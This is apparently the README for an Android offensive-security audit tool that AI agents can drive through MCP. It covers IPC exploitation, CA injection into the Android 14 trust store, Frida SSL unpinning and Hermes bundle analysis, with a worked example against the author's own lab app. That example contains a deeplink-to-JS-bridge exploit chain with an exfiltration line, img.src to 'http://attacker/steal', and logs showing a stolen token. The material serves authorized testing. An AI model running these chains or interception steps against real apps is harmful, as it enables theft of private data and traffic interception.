# droid-recon — complete usage guide

Android offensive-security audit engine. Static attack surface → IPC exploitation with a
verification oracle → TLS interception → native/Ghidra → UI exploration → attack chains.

Zero third-party runtime dependencies. No LLM in-process, no telemetry, no cloud.

---

## 0. The rule everything depends on

> **The manifest establishes reachability. Probes only establish effect.**

`adb shell` runs as the shell UID and holds `START_ANY_ACTIVITY`. It can launch any
activity — exported or not — and query providers no third-party app could touch. So a
probe that "succeeds" tells you *what happens*, never *who can make it happen*.

Every observation carries `reachable_from`, computed from manifest facts only:

| Value | Meaning | Can it be a finding? |
|---|---|---|
| `browser` | Exported + BROWSABLE — triggerable from a web page | **Yes**, highest value |
| `third_party_app` | Exported, no guard or a `normal`/`dangerous` guard | **Yes** |
| `shell` | Not exported. Only adb/root reaches it | **Never** |
| `none` | Exported but `signature`/`privileged` guarded | **Never** (without the key) |

"Unexported activity launched via `adb shell am start`" is **not a bug**. It works on
every Android device ever shipped. Triage rejects it by construction.

---

## 1. Install

```bash
git clone https://github.com/SoufElhabti/droid-recon && cd droid-recon
uv venv --python 3.12 .venv
uv pip install -e ".[dev]"
uv pip install mitmproxy            # optional: network interception
.venv/bin/python -m pytest tests/ -q
```

Runs on **macOS and Linux**. Zero third-party runtime dependencies — Python >= 3.11
stdlib only — and there is no platform branching anywhere in the source.

**External tools** (found automatically; each degrades gracefully if absent):

| Tool | Needed for | macOS | Linux |
|---|---|---|---|
| Android SDK (`adb`, `emulator`, `apkanalyzer`) | everything | `brew install --cask android-commandlinetools` | Android Studio, or `sdkmanager` from the command-line tools |
| `jadx` | code sweep, provider paths, extra keys | `brew install jadx` | distro package, or unpack the release |
| `apktool` | FileProvider paths, network security config | `brew install apktool` | `apt install apktool` |
| `frida` | instrumentation, native tracing | `pip install frida-tools` | `pip install frida-tools` |
| `ghidra` | native binary analysis | `brew install ghidra` | unpack to `/opt/ghidra` |
| `mitmproxy` | traffic capture | `uv pip install mitmproxy` | `uv pip install mitmproxy` |

Discovery order is `ANDROID_HOME` / `ANDROID_SDK_ROOT`, then `PATH`, then the venv's
`bin/`, then the SDK layout. Ghidra reads `GHIDRA_INSTALL_DIR` first. Setting those two
environment variables is enough on any host; the built-in path guesses cover the usual
Linux (`~/Android/Sdk`, `/usr/lib/android-sdk`, `/opt/android-sdk`) and macOS locations.

### Linux notes

```bash
sudo apt install openjdk-21-jdk unzip
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$PATH
```

The emulator needs KVM rather than macOS's HVF, which is the one thing that actually
bites:

```bash
sudo usermod -aG kvm $USER      # then log out and back in
```

Inside a cloud VM you additionally need nested virtualisation enabled, otherwise the
emulator silently falls back to software rendering and a ~23 s boot becomes minutes.
Any stock JDK 17/21 works — the GraalVM pin in the Lottie research rig is a workaround
for a specific macOS host, not a requirement of this tool.

Check what's live: `droid-recon device list` and the `device_status` MCP tool.

## 2. Use from Claude Code or Codex (MCP)

```jsonc
// .mcp.json (Claude Code) — or the equivalent Codex MCP config
{ "mcpServers": {
    "droid-recon": {
      "command": "/absolute/path/droid-recon/.venv/bin/droid-recon",
      "args": ["mcp"]
    }}}
```

29 tools. Transport is newline-delimited JSON-RPC 2.0 (MCP stdio standard), **not** LSP
`Content-Length` framing. Every tool returns a bounded summary plus an `artifact` path —
read the artifact only when the summary points somewhere.

`session_status` tells the agent what's done and what to run next, so it can drive itself:

```
device_up → static_analyze → code_analyze → probe_ipc → exploit_campaign
   → network_setup → network_capture → native_trace → ghidra_analyze
   → app_authenticate → explore_app → build_chains → triage → get_report
```

---

## 3. Command reference

### Device

```bash
droid-recon device list                      # AVDs + attached devices
droid-recon device up --avd webview_lab      # headless boot (~25s), waits for pm, adb root
droid-recon device up --http-proxy 10.0.2.2:8080   # boot-time proxy — REQUIRED for WebView
droid-recon device info
droid-recon device packages [--third-party]
droid-recon device pull com.some.app --out ./targets   # real target, no download
droid-recon device down
```

`--http-proxy` matters: **Android WebView ignores `settings put global http_proxy`**
(Chromium's own network stack). Ordinary HTTP libraries honour the runtime setting;
WebView does not. Boot-time is the only reliable way, and it needs a restart.

### Static — always start here (~2s, no device)

```bash
droid-recon static ./target.apk              # accepts an .apk OR a split-set directory
droid-recon static ./target.apk --no-resources   # skip apktool
```

Gives every component with `exported`, **how that was determined** (explicit flag vs
inferred from an intent-filter vs targetSdk default), `reachable_from`, deep links,
provider authorities, FileProvider paths, and a triage verdict:

- `SKIP — no exported components` → stop.
- `LOW — …all signature-guarded` → stop unless you hold the signing key.
- `INVESTIGATE — N third-party-reachable, …` → continue.

### Lottie corpus triage — pick targets before spending a `code` run

```bash
droid-recon lottie scan ./apk-corpus            # a directory of APKs, or explicit files
droid-recon lottie scan --installed             # pull + scan every third-party package
```

Archive-only: no jadx, no decompilation, nothing executed — just zip and string
scanning, so it is safe to point at untrusted APKs and costs ~0.3 s each. Measured: 17
installed packages pulled and ranked in 5 s.

Results are ranked by how exploitable the Lottie stack is. The top verdict,
`dotlottie_native_expressions_b64`, means the dotLottie native player, the ThorVG
expression engine and the base64 raw-write sink all occur in the **same ELF** — the
structural preconditions for the cross-player expression use-after-free.

**Presence is not exploitability.** A candidate only becomes a finding once the app is
shown to render animation bytes an attacker can influence, so follow up with
`code` and `frida run --script lottie_tracer` on the survivors. Apps carrying only
dotLottie *format* markers, or lottie-android / rlottie, rank below and are not
candidates — those stacks have no expression engine at all.

The `lottie_scan` MCP tool exposes the same sweep.

### Code — the step that makes exploitation work

```bash
droid-recon code ./target.apk                # jadx (cached by APK sha256, ~15s/18MB)
```

Sink/source sweep with library-noise filtering, plus three extractions that are the
difference between finding a bug and not:

- **Provider URI paths and `call()` methods** from `UriMatcher.addURI` literals.
  `dumpsys` gives authorities, never paths; `content query` on a bare authority errors.
- **Intent extra keys with their accessor types.** An app doing
  `getStringExtra(MainActivity.EXTRA_URL)` uses the key `"EXTRA_URL"` — a generator
  guessing `url`/`link`/`target_url` lands nothing and reports a clean run against a
  direct `loadUrl()` sink. Types matter too: a key read via `getIntExtra` receives
  nothing when sent with `--es`.
- **Lottie Q1-Q10 fingerprinting and local delivery-path evidence.** This finds
  obfuscated lottie-android from stable parser strings, lottie-web/dotLottie assets,
  and rlottie forks even when their shared object is renamed (for example
  `libdsti.so`, via rlottie ABI symbols and its Java native wrapper). It also identifies
  stripped or renamed dotLottie-native/ThorVG expression builds when the dotLottie C API
  and multiple expression-runtime markers occur in the same ELF. Presence is reported
  separately from attacker-influenced delivery and still requires runtime confirmation.

### IPC probing and exploitation

```bash
droid-recon dynamic ./target.apk --type provider --traversal --screenshots
droid-recon exploit ./target.apk --max-payloads 10 --type activity
```

`dynamic` walks the declared surface (activities, deep links, broadcasts, services,
provider queries). `exploit` sends crafted payloads and verifies each with the oracle.
Results stream to `exploits.jsonl` as they happen, so an interrupt loses nothing.

### Network

```bash
droid-recon net setup                        # CA into the Android 14 system trust store
droid-recon net status
droid-recon net capture com.target.app --duration 60
droid-recon net reset
```

Reports **why** a capture is empty rather than a bare zero:

| Symptom | Meaning | Fix |
|---|---|---|
| 0 flows, 0 handshake failures | proxy never reached | check the proxy; WebView needs boot-time `--http-proxy` |
| 0 flows, N handshake failures | traffic arrives, cert rejected | `net setup`, or the app is pinned |
| N flows, M handshake failures | some endpoints pinned | `frida run <pkg> --script ssl_unpin` |

### Frida / native

```bash
droid-recon frida setup                      # version-matched frida-server, auto-fetched
droid-recon frida run com.target.app --script ssl_unpin   # crypto_logger, webview_hooks, lottie_tracer
droid-recon native libs com.target.app
droid-recon native trace com.target.app --mode jni        # jni | libc | exports
```

`--mode jni` recovers the Java↔native mapping **including dynamically-registered methods
that appear nowhere in jadx output**. Start there; its output tells you which modules
justify the cost of `exports`.

`lottie_tracer` observes lottie-android composition factories, LottieFiles dotLottie
JNI data/string loads, and Telegram/Samsung rlottie wrapper paths (`createWithJson`,
file/view setup, and sticker URLs). Arguments are bounded and secret-redacted; streams
are never consumed by the tracer. The terminal and MCP response keep a bounded head/tail
while the complete transcript is saved under `sessions/<package>/frida/`.

### Ghidra

```bash
droid-recon ghidra analyze ./target.apk --max-libs 3
droid-recon ghidra decompile ./libfoo.so Java_com_x_Native_decrypt
```

JNI entry points (the surface reachable from Java), dangerous imports
(`system`/`exec`/`dlopen`/`strcpy`/`ptrace`), embedded secrets and endpoints.

### UI and credentials

```bash
export DROID_RECON_USER=… DROID_RECON_PASS=…     # or --credentials creds.json
droid-recon ui auth com.target.app
droid-recon ui explore com.target.app --max-screens 25
droid-recon ui state com.target.app
```

`ui auth` finds the login form by class/resource-id/hint, fills it, submits, and
**verifies** you left the login wall with no error text. Credential values are redacted
from every artifact. `ui explore` crawls breadth-first with a structural signature per
screen and skips destructive controls (logout, delete, purchase) by design.

### Synthesis

```bash
droid-recon chains com.target.app            # correlate layers, replay PoCs to verify
droid-recon triage com.target.app            # observations -> findings (3 gates)
droid-recon report com.target.app            # bounded digest (markdown or json)
droid-recon audit ./target.apk --screenshots --traversal   # full pipeline
```

---

## 4. Reading the output

`sessions/<package>/`

| File | What it is |
|---|---|
| `attack_surface.json` | Every component, exported state + provenance, `reachable_from`, issues |
| `code_report.json` | Sinks/sources, focused view, provider paths, extra keys, storage scan |
| `observations.jsonl` | Append-only. Every probe. High recall, low precision. **Not findings.** |
| `exploits.jsonl` | Every payload attempt with its oracle verdict and evidence |
| `findings.jsonl` | Triage output only |
| `triage_candidates.json` | **Your manual queue** + every rejection with its reason |
| `chains.json` | Cross-layer attack chains with verification results |
| `dead-ends.md` | What yielded nothing, so the next run doesn't repeat it |
| `state.json` | Resumable: phase, steps done, counts |
| `screenshots/` | PNGs — read them directly; that is the vision layer |

Read `report.md` first. Open artifacts only when it points you somewhere.

## 5. The verification oracle

`am start` returns `Status: ok` for almost anything, so "the command ran" is not evidence.
Each payload declares an expectation up front; the oracle snapshots before/after and
compares across logcat, UI tree, process liveness, captured traffic, and a per-payload
**canary** string.

Verdicts: `confirmed` (canary provably reached a sink / canary URL fetched / expected
crash) · `probable` (expected transition or string) · `none`.

Six rules stop it lying — **each was added after it produced a real false positive:**

| It reported | Actually was | Rule now |
|---|---|---|
| 14/14 payloads "CONFIRMED" | The `;` in an intent URI was split by the *device* shell; `am` threw `No intent supplied` and echoed the canary back | Quote every arg for the device shell; bail on `command_error` before looking for evidence |
| 3/14 "probable" | `am start -n pkg/.Foo` focuses Foo every time | Landing on the *requested* component is the null result; only landing elsewhere counts |
| Every probe "crashed" | Our own `uiautomator dump` threw `UiAutomationService … already registered` | Filter instrumentation crashes by stack **and** `FATAL EXCEPTION:` thread name |
| 3 "credential leaks" | `errorCallbackToken=null` from WindowManager | Whole-word keys + value-shape + package attribution + framework-tag exclusion |
| Canary "confirmed" | `am`'s own echo of our request | Strip echo lines before searching |
| — | A platform denial | `Permission Denial` beats every positive signal |

An **auth wall is not an auth bypass**: landing on a gated activity that renders a login
form is reported as *not* a bypass, however cleanly `am start` returned.

## 6. Triage gates

An observation becomes a finding only if all three hold:

1. **Reachability** — `reachable_from ∈ {third_party_app, browser}`, from the manifest.
2. **Effect** — rows/bytes returned, a crash, or credential-shaped material. `Status: ok`
   is not an effect.
3. **Story** — a source → sink → chain can be stated.

Pass 1+2 but not 3 → **candidate**, in `triage_candidates.json` for you to adjudicate.

Two precision rules: findings are **deduplicated** per component+kind (one misconfigured
provider across six paths is one finding with six PoCs), and a package under
`sharedUserId=android.uid.system` gets severity dropped one notch with an explicit
"likely by design" caveat — `content://settings/*` is world-readable by design, and
filing an AOSP design decision as a bug burns credibility.

---

## 7. Worked example — a real critical finding

Target: `ma.poneglyph.webviewlab` (owned, authorized). Full session below.

```bash
# 1. Boot with a boot-time proxy so WebView traffic is capturable
droid-recon device up --http-proxy 10.0.2.2:8080
droid-recon net setup                      # CA into the conscrypt APEX

# 2. Static — find the remote entry point
droid-recon static ./targets/webviewlab.apk
#   INVESTIGATE — 13 third-party-reachable, browsable, debuggable
#   DeepLinkSinkActivity | reach=browser | webviewlab://open, https://webviewlab.poneglyph.ma/open

# 3. Code — what does it do with the deeplink?
droid-recon code ./targets/webviewlab.apk
#   DeepLinkSinkActivity reads ?flavor= and ?url= and routes to 11 WebView activities,
#   forwarding the attacker URL as EXTRA_URL. JsBridgeActivity then does:
#     setJavaScriptEnabled(true)
#     addJavascriptInterface(VulnerableJsBridge, "AndroidBridge")   // no origin check
#     webView.loadUrl(attacker_url)
#   VulnerableJsBridge exposes: readFile(path), fireIntent(uri), eval(js), getDeviceId()
```

**The chain:** a web page → `webviewlab://open?flavor=jsbridge&url=http://attacker/evil.html`
→ attacker HTML in a WebView with the bridge in scope → `AndroidBridge.readFile()` runs as
the app UID → exfiltrate.

Proving it (not asserting it):

```bash
# Plant a canary the app alone can read
adb shell 'echo "<map><string name=\"auth_token\">SECRET</string></map>" \
  > /data/data/ma.poneglyph.webviewlab/shared_prefs/secrets.xml'
adb shell 'chown u0_a192:u0_a192 …/secrets.xml; chmod 600 …/secrets.xml'
# -rw------- u0_a192 u0_a192   ← app-only. Another app cannot read it.

# Serve attacker HTML that calls the bridge and exfiltrates
#   AndroidBridge.readFile('/data/data/…/secrets.xml')  →  img.src = 'http://attacker/steal?data='+…

droid-recon send_payload …    # or fire the deeplink through the tool (never raw adb — see below)
```

Result:

```
W/WVLAB-deeplink   : routing -> JsBridgeActivity url=http://10.0.2.2:8099/evil.html
W/WVLAB-bridge-vuln: readFile(/data/data/ma.poneglyph.webviewlab/shared_prefs/secrets.xml)
W/WVLAB-bridge-vuln: readFile ok, 118 bytes

ATTACKER SERVER:
EXFIL_RECEIVED: <map><string name="auth_token">DRxSECRET_PRIVATE_APP_DATA_9f3a2b</string></map>
```

An app-private, mode-0600 file left the device to an attacker-controlled host, triggered
by opening a link. **CRITICAL.**

> **Gotcha worth internalising:** the first attempt used raw `adb shell am start -d '…&url=…'`
> from bash and silently failed — the device shell ate the `&`, so `url=null` and the app
> loaded its default page. Going through `droid-recon` (which quotes every argument for the
> device shell) made it work. Use the tool, not raw adb, for anything with `&`, `;`, `'` or
> spaces.

### Full result set

| ID | Severity | Finding |
|---|---|---|
| F001 | **CRITICAL** | Remote page steals app-private files via exposed JS bridge (`readFile`, `fireIntent`, `eval`, `getDeviceId`) |
| F002 | **HIGH** | BROWSABLE deeplink loads an arbitrary attacker URL into 11 different WebViews — the enabling primitive |
| F003 | **HIGH** | `onReceivedSslError → proceed()` unconditionally — any invalid cert accepted (verified with an expired cert) |
| F004 | **HIGH** | Remote deeplink loads `file:///data/data/<pkg>/…` with `AllowFileAccessFromFileURLs(true)` |
| F005 | **HIGH** | `loadDataWithBaseURL` with attacker-chosen origin + universal file access — same-origin policy bypass |

Reproduce any of them:

```bash
droid-recon report ma.poneglyph.webviewlab      # full chains, PoCs, impact, evidence
```


---

## 7b. Worked example #2 — a hardened target, and why "no findings" is a result

Target: `com.humanforce.mobileapp` 10.5.24 (React Native, 72 MB, 47 native libs).
Full report: [`docs/example-report-humanforce.md`](docs/example-report-humanforce.md).

The first example found a critical. This one did not — and the discipline that produces
that answer is the point of the tool.

### What the pipeline established

```bash
droid-recon static ./Humanforce.apk        # 30 components, only 4 exported
droid-recon code   ./Humanforce.apk        # 10,131 files swept, 0 secrets
droid-recon net capture com.humanforce.mobileapp
```

| Check | Result |
|---|---|
| Exported components | 4 of 30 — MainActivity + 2 Firebase receivers + Play Services, all legitimate |
| Content providers | **all 7 unexported** — no provider surface at all |
| App Links (`dl.humanforce.com`) | `autoVerify="true"` — the SSO callback **cannot** be hijacked by a competing app |
| `debuggable` / `allowBackup` / cleartext | all off |
| Hardcoded secrets | none (see the Hermes note below) |
| Cognito **Identity** Pools | none — so no unauthenticated AWS-credential path |
| Google Maps key | scoped to the Maps SDK for Android (correct); returns "API not activated", not "not authorized" |
| World-readable files | zero |
| Runtime storage | only an FCM push token in a Play Services file, mode 660 |

Result: **one LOW, one MEDIUM**, no critical or high — after covering every client-side
layer the tool has:

| Layer | Covered | Outcome |
|---|---|---|
| Manifest / components | ✓ | 4 of 30 exported, all legitimate |
| Content providers | ✓ | all 7 unexported |
| App Links | ✓ | `autoVerify="true"` |
| Deeplinks (6 variants, dynamic) | ✓ | all terminate on the login wall |
| dex sweep (10,131 files) | ✓ | 0 secrets; every sink sits in an OSS dependency |
| Hermes bundle | ✓ | no secrets, no Identity Pools |
| WebView config | ✓ | `allowUniversalAccessFromFileURLs` absent; `originWhitelist` used |
| Storage | ✓ | 0 world-readable; only an FCM token |
| Network capture | ✓ | 3 flows, no cleartext, no secrets in transit |
| **Native (47 libs, Ghidra)** | ✓ | **all stock RN/Crashlytics/uCrop — no app-authored native code, 0 secrets** |

### React Native / Hermes — a gap worth knowing

An RN app's logic is not in the dex. `droid-recon code` swept 10,131 Java files and found
nothing meaningful, because the app lives in `assets/index.android.bundle` — 8.4 MB of
**Hermes bytecode**, which the tool does not currently parse.

`strings` is useless on it: Hermes packs its string table as one contiguous blob with no
NUL separators, so you get 2,800 lines of garbage. The working approach:

```bash
unzip -o -q app.apk 'assets/*' -d /tmp/x
# find the string table by entropy — it reads ~100% printable while code blocks read ~30%
python - <<'EOF'
import pathlib, collections, math
d = pathlib.Path('/tmp/x/assets/index.android.bundle').read_bytes()
for i in range(0, len(d), 65536):
    b = d[i:i+65536]
    pr = sum(1 for c in b if 32 <= c < 127)/len(b)
    if pr > 0.95: print(hex(i), f"{pr:.0%}")   # <-- the string table
EOF
# then slice that region out and grep it for endpoints, pool ids, keys
```

That recovered the real backend surface: `api.humanforce.com/v3`, `api-uk`, `api.us`,
`api-global`, `apitest`, `api.humanforce-staging.io`, `auth.humanforce.io`, plus AWS
Amplify/Cognito **User** Pool IDs.

**And a calibration point:** Cognito *User* Pool IDs (`region_XXXXXXXX`) are **public
identifiers** that every client must ship. Finding them is not a vulnerability. What would
matter is an *Identity* Pool (`region:uuid`, can mint unauthenticated AWS credentials) or a
client secret — neither was present. Reporting the User Pool IDs as "hardcoded credentials"
is a classic inflated finding.

### The deeplink surface, tested rather than assumed

`humanforce://` is registered with **no host, no path, no autoVerify** — strictly broader
than the `https://dl.humanforce.com/*` filters beside it. That looks promising, so it was
tested rather than written up:

```
humanforce://sso-sign-in                                  -> login screen
humanforce://onboarding                                   -> login screen
humanforce://home                                         -> login screen
humanforce://sso-sign-in?url=http://attacker/evil.html    -> login screen
humanforce://sso-sign-in?token=CANARY&code=CANARY         -> login screen
https://dl.humanforce.com/sso-sign-in?code=X&state=Y      -> login screen
```

Six variants, no authentication bypass, no URL injection, no WebView load. So it is
filed **LOW — hardening**, with the negative evidence recorded in the finding. Writing it
up as "High: unauthenticated deeplink entry point" would be a false positive: the surface
is real, the impact is not.

### Where critical/high could still live here

Everything above is the **client-side, pre-authentication** surface, which is what an APK
plus an emulator can reach. Not covered, and requiring authorization from the vendor:

- The authenticated `api.humanforce.com/v3` surface — IDOR/BOLA on employee, roster,
  timesheet and payroll objects is where a workforce product's real risk sits.
- The SSO flow end-to-end against the live IdP.
- `api.humanforce-staging.io` and `apitest.humanforce.com` — non-production hosts
  referenced by a production build are worth checking for weaker controls.

Do that under a disclosure programme or a written engagement, not off a downloaded APK.

### The lesson

A tool that always finds something is a tool that always lies. Two targets, same
pipeline: one produced a proven critical with an exfiltrated file, the other produced a
single LOW after every promising lead was tested and fell over. Both are correct outputs.

---

## 8. Network interception on Android 14 — what actually works

The live trust store on API 34 is `/apex/com.android.conscrypt/cacerts`, a read-only ext4
mount. **Writing to `/system/etc/security/cacerts` changes a directory nothing reads.**

`net setup` does this instead:

1. Copy the 134 existing certs to staging; mount a **tmpfs over the APEX cacerts dir**;
   restore them plus the mitmproxy CA.
2. Label everything `u:object_r:system_security_cacerts_file:s0`. **This is the step that
   silently breaks everything if wrong** — a fresh tmpfs gives files `appdomain_tmpfs`,
   and Conscrypt then ignores a certificate that is present, readable and correctly
   hashed, failing with `CertPathValidatorException: Trust anchor … not found`.
3. `nsenter` into **zygote's** mount namespace (and every running app's) and repeat,
   *including the relabel*. Apps do not share the shell's namespace — without this the
   store looks patched from `adb shell` and is unchanged for every app.

Measured: 135 certs, overlay active, ~90 namespaces patched, a real `HttpsURLConnection`
from inside an app decrypted with zero handshake failures.

All of it is destroyed on reboot — it is a per-session operation. Re-run `net setup` and
`frida setup` after any reboot.

---

## 9. Known limits — measured, not assumed

- **Probes run as the shell UID.** `reachable_from` is a manifest *inference*, not a
  demonstration. Proving it needs an unprivileged attacker APK making the same calls.
  This is the single biggest gap and the natural next feature.
- **The WebView payload positive control has not reproduced.** Sending the correct
  code-derived `EXTRA_URL` with a canary URL, with the emulator on `-http-proxy` and the
  CA installed, produced no captured canary request — while other traffic captured fine.
  Treat automated `webview_url_injection` results as **untested**. (The manual chain in
  §7 *is* proven — it just wasn't the automated payload path that proved it.)
- **WebView-rendered DOM is not exposed to `uiautomator`.** Screen assertions on WebView
  content will read empty; use logcat and traffic instead.
- **Android WebView ignores the runtime proxy setting** — boot-time `--http-proxy` only.
- `native trace --mode exports` needs the app running with its `.so` loaded; on a spawn
  use `--mode jni`.
- Chain verification replays adb PoCs only; traffic- and native-anchored chains are built
  but not automatically re-verified.
- `ui explore` is heuristic — it will miss flows behind captcha, OTP, biometrics, or
  custom gesture UIs.
- **React Native / Hermes bundles are not parsed.** `code` sweeps the dex, but an RN app's
  logic is Hermes bytecode in `assets/index.android.bundle`. Use the entropy-slice recipe
  in §7b until this is built in. Flutter (`libapp.so`) has the same gap.

## 10. Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `no device attached` | emulator not running | `droid-recon device up` |
| frida "need Gadget to attach" | frida-server not running (killed by reboot) | `droid-recon frida setup` |
| `mitmdump exited immediately` | port already bound by a stale run | `pkill -f mitmdump` |
| Empty capture | see the `interpretation` field | it names which precondition failed |
| Payload had no effect | key guessed, not code-derived | run `droid-recon code` first |
| Ghidra "no result" | Ghidra 12 routes `.py` to PyGhidra | already handled — post-scripts are Java |
| Everything "confirmed" | you are looking at a false-positive class | check `evidence`; see §5 |
| `adb` command mangled | shell metacharacters | use the tool, never raw `adb shell` |

## 11. Authorized use

This is offensive tooling. Use it only on applications you own, have written permission
to test, or that are in scope for an authorized bug-bounty or penetration-testing
engagement. Everything in §7 was run against the author's own application on a local
emulator. See `LICENSE`.
